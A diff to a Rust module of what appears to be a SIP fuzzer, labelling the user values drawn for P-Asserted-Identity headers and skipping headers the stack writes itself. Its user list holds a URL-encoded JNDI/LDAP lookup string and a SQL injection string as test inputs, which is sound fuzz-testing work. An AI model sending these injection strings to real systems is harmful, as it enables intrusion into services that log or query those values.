@@ -6,7 +6,7 @@
 //! read are never drawn.
 
 use scenario_harness::realcall::{quoted_len, InvitePlan};
-use sip_message::header::{NameAddr, PAssertedIdentity, Uri};
+use sip_message::header::{HeaderName, NameAddr, PAssertedIdentity, Uri};
 use sip_message::sip_str::SipStr;
 
 use crate::{chars, payload, FuzzConfig, Rng};
@@ -25,10 +25,21 @@ const STACK_HEADERS: &[(&str, Option<&str>)] = &[
     ("Max-Forwards", None),
 ];
 
-/// The users an added name-addr header draws from when not all chars; a `:`
-/// is escaped, so none reads as a password.
-const USERS: &[&str] =
-    &["+15550100", "%24%7Bjndi%3Aldap%3A%2F%2F192.0.2.1%2Fa%7D", "1555'%20OR%201=1--", "anonymous"];
+/// The users an added name-addr header draws from when not all chars, with
+/// their labels; a `:` is escaped, so none reads as a password.
+pub(crate) const USERS: &[(&str, &str)] = &[
+    ("+15550100", "number"),
+    ("%24%7Bjndi%3Aldap%3A%2F%2F192.0.2.1%2Fa%7D", "jndi"),
+    ("1555'%20OR%201=1--", "sql"),
+    ("anonymous", "anonymous"),
+];
+
+/// Whether the stack writes a header `name` names on every initial INVITE, in
+/// any spelling: a configured list never adds one.
+pub fn stack_writes(name: &str) -> bool {
+    let name = HeaderName::from(name);
+    STACK_HEADERS.iter().any(|(canonical, _)| name.matches(canonical))
+}
 
 /// The host of every drawn identity URI (RFC 2606).
 const HOST: &str = "example.com";
@@ -76,7 +87,7 @@ pub fn draw(rng: &mut Rng, plan: &mut InvitePlan, config: &FuzzConfig, notes: &m
 }
 
 /// `name: value` added to `plan` when no header of that name, in any
-/// spelling, is there and the budget holds it.
+/// spelling, is there or written by the stack, and the budget holds it.
 fn add(
     plan: &mut InvitePlan,
     config: &FuzzConfig,
@@ -85,7 +96,7 @@ fn add(
     note: String,
     notes: &mut Vec<String>,
 ) {
-    if crate::perturb::holds(plan, name) {
+    if stack_writes(name) || crate::perturb::holds(plan, name) {
         return;
     }
     if fits(plan, config, crate::perturb::header_bytes(name, &value)) {
@@ -102,14 +113,20 @@ fn fits(plan: &InvitePlan, config: &FuzzConfig, extra: usize) -> bool {
     used + extra <= config.header_budget
 }
 
-/// A name-addr value with a drawn display name and user: (value, label).
-fn name_addr(rng: &mut Rng, all_chars: bool) -> (String, &'static str) {
-    let (display, label) = payload::display(rng, all_chars);
-    let user =
-        if all_chars && rng.chance(50) { chars::user(rng) } else { rng.pick(USERS).to_string() };
+/// A name-addr value with a drawn display name and user:
+/// (value, `<display label>/<user label>`).
+fn name_addr(rng: &mut Rng, all_chars: bool) -> (String, String) {
+    let (display, display_label) = payload::display(rng, all_chars);
+    let (user, user_label) = if all_chars && rng.chance(50) {
+        (chars::user(rng), "all-chars")
+    } else {
+        let (user, label) = *rng.pick(USERS);
+        (user.to_string(), label)
+    };
     let uri = Uri::parse(&SipStr::owned(&format!("sip:{user}@{HOST}")))
-        .unwrap_or_else(|_| Uri::sip(HOST).with_user(USERS[0]));
-    (PAssertedIdentity::new(NameAddr::new(uri).with_display(display)).to_string(), label)
+        .unwrap_or_else(|e| panic!("a drawn user is a SIP URI user: {user:?}: {e}"));
+    let value = PAssertedIdentity::new(NameAddr::new(uri).with_display(display)).to_string();
+    (value, format!("{display_label}/{user_label}"))
 }
 
 /// One stack header spelled compact or in a drawn case, unless a form names
